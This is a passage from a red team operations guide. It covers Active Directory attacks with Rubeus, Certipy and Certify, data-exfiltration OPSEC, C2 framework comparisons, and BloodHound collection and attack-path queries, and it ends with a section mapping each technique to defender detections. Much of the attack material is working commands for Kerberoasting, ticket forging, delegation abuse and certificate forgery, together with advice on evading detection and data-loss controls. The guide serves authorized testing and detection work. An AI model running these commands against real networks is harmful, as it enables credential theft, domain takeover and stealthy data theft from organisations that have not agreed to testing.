| Pass-the-Ticket | mimikatz ptt, Rubeus ptt | High — uses Kerberos |
| Overpass-the-Hash | Rubeus asktgt /rc4: | High — converts hash to ticket |
| RDP hijacking | tscon.exe (SYSTEM context) | Low — visible on console |
| RBCD abuse | Impacket + Rubeus | High — modifies AD objects |

### 12.7 Phase 7 — Active Directory Attacks

#### 12.7.1 Kerberos Attacks with Rubeus

```powershell
# AS-REP Roasting
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Kerberoasting
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# Kerberoasting with OPSEC (AES, specific SPN)
Rubeus.exe kerberoast /aes /ldapfilter:'adminCount=1' /format:hashcat

# Request TGT with hash
Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# Request TGT with AES key (more OPSEC-safe than RC4)
Rubeus.exe asktgt /user:admin /aes256:KEY /ptt /opsec

# S4U delegation abuse (constrained delegation)
Rubeus.exe s4u /user:svc_acct /rc4:HASH /impersonateuser:admin \
  /msdsspn:cifs/target.corp.local /ptt

# Resource-Based Constrained Delegation
Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:admin \
  /msdsspn:cifs/target.corp.local /ptt

# Golden ticket
Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21-... \
  /aes256:KRBTGT_AES_KEY /ptt

# Diamond ticket (modify legitimate TGT PAC — stealthier than golden)
Rubeus.exe diamond /user:admin /domain:corp.local /dc:DC01 \
  /password:pass /enctype:aes /ticketuser:admin /ticketuserid:500 /groups:512

# Pass-the-Ticket
Rubeus.exe ptt /ticket:base64_ticket

# TGT delegation trick (extract usable TGT without elevation)
Rubeus.exe tgtdeleg /nowrap

# Harvest tickets in real-time
Rubeus.exe harvest /interval:30

# Monitor for new TGTs
Rubeus.exe monitor /interval:5 /nowrap
```

**OPSEC considerations for Rubeus:**
- Generates Kerberos protocol traffic from non-lsass process — detectable
- RC4 encryption downgrades are flagged in AES-capable environments
- Use `/opsec` flag where available
- Use `/aes256:` instead of `/rc4:` to avoid encryption downgrade alerts
- Diamond tickets are stealthier than golden tickets (built on real TGT)
- `tgtdeleg` extracts TGTs without touching LSASS

#### 12.7.2 AD CS Attacks with Certipy / Certify

**Certipy** (Python, attacker workstation) and **Certify** (C#, on-target) exploit
AD Certificate Services misconfigurations across ESC1-ESC16.

```bash
# Enumerate CA and templates
certipy find -u user@corp.local -p pass -dc-ip DC01

# ESC1 — Enrollee can specify Subject Alternative Name
certipy req -u user@corp.local -p pass -ca CORP-CA \
  -template VulnTemplate -upn admin@corp.local

# ESC4 — Template allows owner to modify configuration
certipy template -u user@corp.local -p pass -template VulnTemplate \
  -save-old

# ESC8 — NTLM relay to HTTP enrollment endpoint
certipy relay -ca CA01 -template DomainController

# Authenticate with forged certificate
certipy auth -pfx admin.pfx -dc-ip DC01

# Shadow Credentials
certipy shadow auto -u user@corp.local -p pass -account target_user

# Golden Certificate (CA private key compromise)
certipy forge -ca-pfx ca.pfx -upn admin@corp.local -subject 'CN=Admin'
```

**Certify** (C# — runs on compromised host):
```powershell
# Enumerate vulnerable templates
Certify.exe find /vulnerable

# Enumerate CAs
Certify.exe cas

# Request certificate with SAN
Certify.exe request /ca:CORP-CA /template:VulnTemplate /altname:admin
```

### 12.8 Phase 8 — Data Exfiltration

**Channels:**
- DNS tunneling (dnscat2, Cobalt Strike DNS beacon)
- HTTPS C2 channel (embedded in normal beacon traffic)
- Cloud storage (Azure Blob, S3 — via stolen cloud credentials)
- SMB named pipes within the network
- **skyhook** — round-trip obfuscated HTTP file transfer

**OPSEC:**
- Compress and encrypt data before exfiltration
- Use legitimate cloud services where possible
- Throttle transfer rates to avoid DLP triggers
- Schedule transfers during business hours to blend with normal traffic
- Monitor file sizes — large transfers trigger alerts

---

## 13. Tool Usage Patterns

### 13.1 Situational Awareness

| Tool | Purpose |
|------|---------|
| **Seatbelt** | Host security survey (AV, AppLocker, UAC, PowerShell logging) |
| **SharpEDRChecker** | Detect installed EDR/AV products |
| **SharpView** | C# PowerView replacement for AD enumeration |
| **StandIn** | AD post-compromise toolkit |
| **ADRecon** | Comprehensive AD data gathering and reporting |

### 13.2 C2 Frameworks Comparison

| Framework | Language | Key strength |
|-----------|----------|--------------|
| **Cobalt Strike** | Java/C | Industry standard, malleable profiles, extensive BOF ecosystem |
| **Brute Ratel C4** | C/C++ | Designed for EDR evasion from ground up |
| **Sliver** | Go | Open-source, mutual-TLS/HTTP(S)/DNS, implant generation |
| **Havoc** | C/C++ | Modern, malleable, open-source |
| **Mythic** | Python | Extensible agent architecture, collaboration features |
| **Covenant** | C# | .NET-native, web UI, good for .NET environments |
| **Empire** | PowerShell/C# | Mature PowerShell agent, module library |
| **NimPlant** | Nim | Lightweight first-stage, hard to detect |

### 13.3 Esoteric C2 Channels

| Tool | Channel |
|------|---------|
| **GraphStrike** | Cobalt Strike HTTPS beaconing over Microsoft Graph API |
| **CobaltBus** | Azure ServiceBus external C2 |
| **C3** | Custom covert channels (Slack, Teams, Dropbox, etc.) |

---

## 14. BloodHound and Attack Path Analysis

### 14.1 Architecture (Community Edition)

BloodHound CE is a monolithic web application:
- **Frontend:** React + Sigma.js (graph visualization)
- **Backend:** Go REST API
- **Storage:** PostgreSQL (app data) + Neo4j (graph data)
- **Collectors:** SharpHound (AD), AzureHound (Entra/Azure)

Supports Active Directory, Azure/Entra ID, and multi-platform identity via OpenGraph.

### 14.2 Data Collection

```powershell
# SharpHound collection (all methods)
SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bh.zip

# SharpHound with stealth options
SharpHound.exe -c Default,ACL,Trusts --stealth --excludedcs --throttle 1000 --jitter 30

# AzureHound
azurehound -t <tenant_id> --refresh-token <token> -o azure_data.json
```

### 14.3 Key Cypher Queries

**High-value target identification:**

```cypher
-- Find shortest path from owned to high-value targets
MATCH p=shortestPath((g {owned:true})-[*1..]->(n {highvalue:true}))
WHERE g<>n RETURN p

-- All Domain Admin sessions
MATCH (n:User)-[:MemberOf]->(g:Group)
WHERE g.objectid ENDS WITH '-512'
MATCH p = (c:Computer)-[:HasSession]->(n) RETURN p

-- Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH (g:Group) WHERE g.objectid ENDS WITH '-512'
MATCH p = shortestPath((u)-[*1..]->(g)) RETURN p
```

**Delegation and privilege analysis:**

```cypher
-- Constrained delegation
MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p

-- Unconstrained delegation (excluding DCs)
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH '-516'
WITH COLLECT(c1.name) AS domainControllers
MATCH (c2:Computer {unconstraineddelegation:true})
WHERE NOT c2.name IN domainControllers RETURN c2

-- Users with DCSync rights (GenericAll/Replication)
MATCH p=(n:User)-[:GenericAll|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p
```

**ACL abuse paths:**

```cypher
-- GPO abuse paths
MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|
  WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p

-- Force password change rights
MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p

-- AddMember rights for non-admin users
MATCH (n:User {admincount:False})
MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p
```

**AS-REP roasting candidates:**

```cypher
MATCH (u:User {dontreqpreauth: true}) RETURN u
```

**Kerberoastable accounts with stale passwords:**

```cypher
MATCH (u:User) WHERE u.hasspn=true
AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400))
AND NOT u.pwdlastset IN [-1.0, 0.0]
RETURN u.name, u.pwdlastset ORDER BY u.pwdlastset
```

**Cross-domain trust abuse:**

```cypher
MATCH p=(n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN p
```

**Azure-specific queries:**

```cypher
-- Azure Global Administrators
MATCH p=(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

-- On-prem users with Azure privilege edges
MATCH p=(m:User)-[r:AZResetPassword|AZOwns|AZUserAccessAdministrator|
  AZContributor|AZAddMembers|AZGlobalAdmin|AZVMContributor|
  AZOwnsAZAvereContributor]->(n)
WHERE m.objectid CONTAINS 'S-1-5-21' RETURN p

-- Paths to Azure Key Vault
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

-- Service Principal privilege mapping
MATCH p = (g:AZServicePrincipal)-[r]->(n) RETURN p
```

**MSSQL service discovery:**

```cypher
MATCH (c:Computer)
WHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL')
RETURN c
```

---

## 15. Detection Opportunities

Every offensive technique has corresponding detection vectors. This section maps
key red team activities to blue team detection points.

### 15.1 Infrastructure Detection

| Red team activity | Detection vector |
|-------------------|-----------------|
| Domain fronting | TLS SNI vs HTTP Host header mismatch |
| DNS C2 beacons | High-entropy DNS queries, unusual TXT record volume |
| DoH C2 | Unusual volume to DoH resolvers (1.1.1.1, 8.8.8.8 over HTTPS) |
| Malleable C2 traffic | JA3/JA3S fingerprinting of non-standard TLS clients |
| FireProx IP rotation | AWS API Gateway source IPs, X-Forwarded-For headers |
| Evilginx AiTM | Certificate transparency logs, rapid domain registration |

### 15.2 Endpoint Detection

| Red team activity | Detection vector |
|-------------------|-----------------|
| Mimikatz (sekurlsa) | LSASS process access (Sysmon Event ID 10) |
| DCSync | Directory Service Access events (4662) with replication GUIDs |
| Rubeus (non-lsass Kerberos) | Process on port 88 that is not lsass.exe |
| RC4 Kerberoasting | Encryption type downgrade (RC4 in AES environment) |
| Golden ticket | TGT with impossible lifetime or missing PAC |
| Process injection | Cross-process handle access, RWX memory allocations |
| BOF execution | Unusual in-process behavior without child process creation |
| Named pipe C2 | Non-standard named pipe creation (Sysmon Event ID 17/18) |

### 15.3 AD Attack Detection

| Red team activity | Detection vector |
|-------------------|-----------------|
| AS-REP roasting | Event ID 4768 with PreAuth type 0 |
| Kerberoasting | Event ID 4769 with RC4 encryption and service accounts |
| RBCD modification | Event ID 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity) |
| AD CS ESC1 | Certificate request with SAN different from requestor |
| Shadow Credentials | msDS-KeyCredentialLink attribute modification |
| BloodHound collection | LDAP query volume spike, SAMR enumeration |
| Password spraying | Multiple 4625 events across accounts from single source |

---

## References

- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [ired.team — Red Teaming Tactics and Techniques](https://www.ired.team/)
- [Red Teaming Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit)
- [Malleable C2 Design and Reference Guide](https://github.com/threatexpress/malleable-c2)
- [C2concealer](https://github.com/FortyNorthSecurity/C2concealer)
- [RedWarden](https://github.com/mgeeky/RedWarden) (archived Dec 2025)
- [FireProx](https://github.com/ustayready/fireprox)
- [NetExec](https://github.com/Pennyw0rth/NetExec) / [netexec.wiki](https://www.netexec.wiki/)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Certipy](https://github.com/ly4k/Certipy)
- [Certify](https://github.com/GhostPack/Certify)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [BloodHound Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
